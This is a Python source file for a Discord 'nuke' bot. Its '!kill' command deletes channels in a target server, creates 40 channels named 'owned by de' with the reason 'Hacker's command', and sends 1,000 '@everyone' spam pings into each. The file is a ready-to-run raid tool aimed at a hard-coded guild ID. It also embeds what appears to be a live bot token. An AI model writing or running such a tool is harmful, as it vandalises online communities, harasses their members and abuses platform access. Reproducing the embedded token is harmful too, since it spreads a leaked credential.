import discord

from discord.ext import commands
import asyncio

TOKEN = "MTE4Mjk2NjM1NjkwODQ2MjA5MA.GHnfRZ.NFhAPU9Iy06mHPXNovc-6nSreBGCUQSqE0I0AA"
COMMAND_PREFIX = "!"
TARGET_GUILD_ID = 1190925166008619039 # Replace with the specific guild ID

intents = discord.Intents.all()
client = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)

@client.event
async def on_ready():
    print(f"Logged in as {client.user.name}")

@client.event
async def on_message(message):
    await client.process_commands(message)

@client.command(name="kill")
async def kill(ctx):
    if ctx.guild.id != TARGET_GUILD_ID:
        await ctx.send("This command can only be used in a specific guild.")
        return

    print("Deleting channels and creating new ones...")

    # Fetch the guild object explicitly
    guild = await client.fetch_guild(TARGET_GUILD_ID)

    # Delete channels based on category and name
    for category in guild.categories:
        if category.name == "owned by de":
            channels_to_delete = [channel for channel in category.channels]
            for channel in channels_to_delete:
                try:
                    await channel.delete()
                    await asyncio.sleep(0.1)  # 0.1-second delay after each channel deletion
                except discord.Forbidden:
                    print(f"Failed to delete channel {channel.name} due to missing permissions.")
                except discord.HTTPException as e:
                    print(f"Failed to delete channel {channel.name}. Error: {e}")

    # Creating new channels concurrently
    async def create_channels():
        new_channels = [await guild.create_text_channel(name="owned by de", reason="Hacker's command") for _ in range(40)]
        return new_channels

    # Sending 1,000 pings in each channel with a 0.1-second delay
    async def send_pings(channel):
        messages = ["@everyone owned by de" for _ in range(1000)]
        await asyncio.gather(*[channel.send(message) for message in messages])
        await asyncio.sleep(0.1)  # 0.1-second delay after sending pings

    # Gather all new channels created
    new_channels = await asyncio.gather(create_channels())

    # Send pings in each new channel
    await asyncio.gather(*[send_pings(channel) for channel in new_channels[0]])

    print("Process completed!")

client.run(TOKEN)
